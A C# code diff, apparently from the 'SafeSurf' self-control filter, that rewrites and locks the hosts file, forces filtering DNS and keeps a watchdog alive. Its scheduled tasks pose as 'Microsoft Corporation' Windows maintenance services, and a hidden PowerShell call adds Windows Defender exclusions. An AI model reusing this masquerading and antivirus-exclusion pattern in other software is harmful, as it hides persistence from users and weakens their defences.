@@ -1,4 +1,3 @@
-using Microsoft.Toolkit.Uwp.Notifications;
 using Microsoft.Win32.TaskScheduler;
 using System.Diagnostics;
 using System.Globalization;
@@ -41,7 +40,7 @@ namespace Enforcer
         public static partial bool ShutdownBlockReasonCreate(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] string pwszReason);
         readonly string daemonPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "SSDaemon.exe");
         readonly string windowsPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
-        readonly List<FileStream> filePadlocks = new();
+        readonly List<FileStream> filePadlocks = [];
         readonly Config config = Config.Instance;
         readonly string watchdogPath;
         bool isEnforcerActive = true;
@@ -72,12 +71,7 @@ namespace Enforcer
         {
             AddDefenderExclusion(watchdogPath);
             if (args.Length > 0)
-            {
-                var pid = int.Parse(args[0]);
-                if (pid > 0)
-                    watchdog = Process.GetProcessById(int.Parse(args[0]));
-                ShowMotivation();
-            }
+                watchdog = Process.GetProcessById(int.Parse(args[0]));
             else
             {
                 try
@@ -105,21 +99,18 @@ namespace Enforcer
 
         int StartWatchdog()
         {
-            using (Process executor = new())
-            {
-                executor.StartInfo.FileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "SSExecutor.exe");
-                executor.StartInfo.Arguments = $"\"{watchdogPath}\" {Process.GetCurrentProcess().Id}";
-                executor.StartInfo.CreateNoWindow = true;
-                executor.StartInfo.RedirectStandardOutput = true;
-                executor.Start();
-                var executorResponse = executor.StandardOutput.ReadLine();
-                return executorResponse == null ? throw new NullReferenceException("No pid returned from executor.") : int.Parse(executorResponse);
-            }
+            using Process executor = new();
+            executor.StartInfo.FileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "SSExecutor.exe");
+            executor.StartInfo.Arguments = $"\"{watchdogPath}\" {Environment.ProcessId}";
+            executor.StartInfo.CreateNoWindow = true;
+            executor.StartInfo.RedirectStandardOutput = true;
+            executor.Start();
+            var executorResponse = executor.StandardOutput.ReadLine();
+            return executorResponse == null ? throw new NullReferenceException("No pid returned from executor.") : int.Parse(executorResponse);
         }
 
         void SetHosts()
         {
-            var filterHosts = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"{config.Read("hosts-filter")}.hosts");
             var hosts = Path.Combine(windowsPath, "System32\\drivers\\etc\\hosts");
             try
             {
@@ -130,8 +121,9 @@ namespace Enforcer
                 }
                 else
                 {
-                    File.WriteAllText(hosts, File.ReadAllText(filterHosts));
-                    filePadlocks.Add(new FileStream(hosts, FileMode.Open, FileAccess.Read, FileShare.Read));
+                    File.WriteAllText(hosts, File.ReadAllText(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"{config.Read("hosts-filter")}.hosts")));
+                    if (isEnforcerActive)
+                        filePadlocks.Add(new FileStream(hosts, FileMode.Open, FileAccess.Read, FileShare.Read));
                 }
             }
             catch (IOException) { }
@@ -146,33 +138,39 @@ namespace Enforcer
             {
                 if (IsExpired())
                 {
-                    isEnforcerActive = false;
+                    isEnforcerActive = false;             
                     foreach (var filePadlock in filePadlocks)
                         filePadlock.Close();
-                    using (var taskService = new TaskService())
-                    {
-                        taskService.RootFolder.DeleteTask("SvcStartup", false);
-                        taskService.RootFolder.DeleteTask("SvcMonitor", false);
-                    }
+                    using var taskService = new TaskService();
+                    TaskFolder(taskService).DeleteTask("SvcStartup", false);
+                    TaskFolder(taskService).DeleteTask("SvcMonitor", false);
                     watchdog.Kill();
                 }
                 else
                 {
                     SetCleanBrowsingDNS();
-                    RegisterTask("SvcStartup", new LogonTrigger(), new ExecAction(daemonPath));
-                    RegisterTask("SvcMonitor", new TimeTrigger() { StartBoundary = DateTime.Now, Repetition = new RepetitionPattern(TimeSpan.FromMinutes(1), TimeSpan.Zero) },
-                        new ExecAction(daemonPath, "0"));
+                    RegisterTask("SvcStartup", new LogonTrigger());
+                    RegisterTask("SvcMonitor", new TimeTrigger() { StartBoundary = DateTime.Now, Repetition = new RepetitionPattern(TimeSpan.FromMinutes(1), TimeSpan.Zero) });
                     Thread.Sleep(4000);
-                }        
+                }          
             }
         }
 
         bool IsExpired()
-        {
-            DateTime.TryParse(config.Read("date-enforced"), out DateTime parsedDateEnforced);
-            var networkTime = GetNetworkTime();
-            var expirationDate = parsedDateEnforced.AddSeconds(int.Parse(config.Read("days-enforced")));
-            return networkTime != null && networkTime >= expirationDate;
+        {        
+            DateTime? networkDateTime = null;
+            try
+            {
+                using var tcpClient = new TcpClient();
+                if (tcpClient.ConnectAsync("time.nist.gov", 13).Wait(500))
+                {
+                    using var streamReader = new StreamReader(tcpClient.GetStream());
+                    networkDateTime = DateTime.ParseExact(streamReader.ReadToEnd().Substring(7, 17), "yy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture, DateTimeStyles.AssumeUniversal);
+                }
+            }
+            catch (SocketException) { }
+            DateTime.TryParse(config.Read("date-enforced"), out DateTime dateEnforced);
+            return networkDateTime != null && networkDateTime >= dateEnforced.AddDays(int.Parse(config.Read("days-enforced")));
         }
 
         void SetCleanBrowsingDNS()
@@ -183,24 +181,26 @@ namespace Enforcer
                 if (!isEnforcerActive && config.Read("cleanbrowsing-dns-filter").Equals("off"))
                     dns = null;
                 else if (config.Read("cleanbrowsing-dns-filter").Equals("family"))
-                    dns = new string[] { "185.228.168.168", "185.228.169.168" };
+                    dns = ["185.228.168.168", "185.228.169.168"];
                 else if (config.Read("cleanbrowsing-dns-filter").Equals("adult"))
-                    dns = new string[] { "185.228.168.10", "185.228.169.11" };
+                    dns = ["185.228.168.10", "185.228.169.11"];
                 else
                     return;
                 var currentInterface = GetActiveEthernetOrWifiNetworkInterface();
-                if (currentInterface == null) return;
-                foreach (ManagementObject objMO in new ManagementClass("Win32_NetworkAdapterConfiguration").GetInstances())
+                if (currentInterface != null)
                 {
-                    if ((bool)objMO["IPEnabled"])
+                    foreach (ManagementObject objMO in new ManagementClass("Win32_NetworkAdapterConfiguration").GetInstances().Cast<ManagementObject>())
                     {
-                        if (objMO["Description"].Equals(currentInterface.Description))
+                        if ((bool)objMO["IPEnabled"])
                         {
-                            var objdns = objMO.GetMethodParameters("SetDNSServerSearchOrder");
-                            if (objdns != null)
+                            if (objMO["Description"].Equals(currentInterface.Description))
                             {
-                                objdns["DNSServerSearchOrder"] = dns;
-                                objMO.InvokeMethod("SetDNSServerSearchOrder", objdns, null);
+                                var objdns = objMO.GetMethodParameters("SetDNSServerSearchOrder");
+                                if (objdns != null)
+                                {
+                                    objdns["DNSServerSearchOrder"] = dns;
+                                    objMO.InvokeMethod("SetDNSServerSearchOrder", objdns, null);
+                                }
                             }
                         }
                     }
@@ -217,70 +217,34 @@ namespace Enforcer
                 a.GetIPProperties().GatewayAddresses.Any(g => g.Address.AddressFamily.ToString().Equals("InterNetwork")));
         }
 
-        void RegisterTask(string name, Trigger taskTrigger, ExecAction execAction)
+        void RegisterTask(string name, Trigger taskTrigger)
         {
-            using (var taskService = new TaskService())
-            {
-                taskService.RootFolder.DeleteTask(name, false);
-                var taskDefinition = taskService.NewTask();
-                taskDefinition.Settings.DisallowStartIfOnBatteries = false;
-                taskDefinition.RegistrationInfo.Author = "Microsoft Corporation";
-                taskDefinition.RegistrationInfo.Description = "Ensures all critical Windows service processes are running.";
-                taskDefinition.Principal.RunLevel = TaskRunLevel.Highest;
-                taskDefinition.Triggers.Add(taskTrigger);
-                taskDefinition.Actions.Add(execAction);
-                (taskService.GetFolder("\\Microsoft\\Windows\\Maintenance") ?? taskService.RootFolder).RegisterTaskDefinition(name, taskDefinition);
-            }
-        }
-
-        DateTime? GetNetworkTime()
-        {
-            DateTime? networkDateTime = null;
-            try
-            {
-                var client = new TcpClient("time.nist.gov", 13);
-                using (var streamReader = new StreamReader(client.GetStream()))
-                {
-                    var response = streamReader.ReadToEnd();
-                    var utcDateTimeString = response.Substring(7, 17);
-                    networkDateTime = DateTime.ParseExact(utcDateTimeString, "yy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture, DateTimeStyles.AssumeUniversal);
-                }
-            }
-            catch (SocketException) { }
-            catch (ArgumentOutOfRangeException) { }
-            return networkDateTime;
+            using var taskService = new TaskService();
+            taskService.RootFolder.DeleteTask(name, false);
+            var taskDefinition = taskService.NewTask();
+            taskDefinition.Settings.DisallowStartIfOnBatteries = false;
+            taskDefinition.RegistrationInfo.Author = "Microsoft Corporation";
+            taskDefinition.RegistrationInfo.Description = "Ensures all critical Windows service processes are running.";
+            taskDefinition.Principal.RunLevel = TaskRunLevel.Highest;
+            taskDefinition.Triggers.Add(taskTrigger);
+            taskDefinition.Actions.Add(new ExecAction(daemonPath));
+            TaskFolder(taskService).RegisterTaskDefinition(name, taskDefinition);
         }
 
         void AddDefenderExclusion(string path)
         {
-            var powershell = new ProcessStartInfo("powershell")
-            {
-                UseShellExecute = false,
-                CreateNoWindow = true,
-                Verb = "runas",
-                Arguments = $" -Command Add-MpPreference -ExclusionPath '{path}' -ExclusionProcess '{daemonPath}'"
-            };
-            Process.Start(powershell);
+            using Process powershell = new();
+            powershell.StartInfo.FileName = "powershell";
+            powershell.StartInfo.UseShellExecute = false;
+            powershell.StartInfo.CreateNoWindow = true;
+            powershell.StartInfo.Verb = "runas";
+            powershell.StartInfo.Arguments = $" -Command Add-MpPreference -ExclusionPath '{path}' -ExclusionProcess '{daemonPath}'";
+            powershell.Start();
         }
 
-        void ShowMotivation()
+        TaskFolder TaskFolder(TaskService taskService)
         {
-            string[] quotes = new string[] {
-                "You can either suffer the pain of discipline or live with the pain of regret.",
-                "Strive to become who you want to be, don't allow hardship to divert you from this path.",
-                "Treat each day as a new life, and at once begin to live again.",
-                "If you stop bad habits now, years will pass and it will soon be far behind you.",
-                "Ever tried, ever failed. No matter. Try again, fail again, fail better!",
-                "The only person you are destined to become is who you decide to be.",
-                "I'm not telling you it is going to be easy, i'm telling you it's going to be worth it!",
-                "Hardships often prepare ordinary people for extraordinary things. Don't let it tear you down.",
-                "Be stronger than your strongest excuse or suffer the consequences.",
-                "Success is the sum of small efforts and sacrifices, repeated day in and day out.",
-                "Bad habits are broken effectively when traded for good habits.",
-                "Regret born of ill-fated choices will surpass all other hardships.",
-                "Act as if what you do makes a difference, it does. Decisions result in consequences, both good and bad."
-            };
-            new ToastContentBuilder().AddText("SafeSurf - Circumvention Detected").AddText(quotes[new Random().Next(quotes.Length)]).Show();
+            return taskService.GetFolder("\\Microsoft\\Windows\\Maintenance") ?? taskService.RootFolder;
         }
 
         protected override void WndProc(ref Message aMessage)
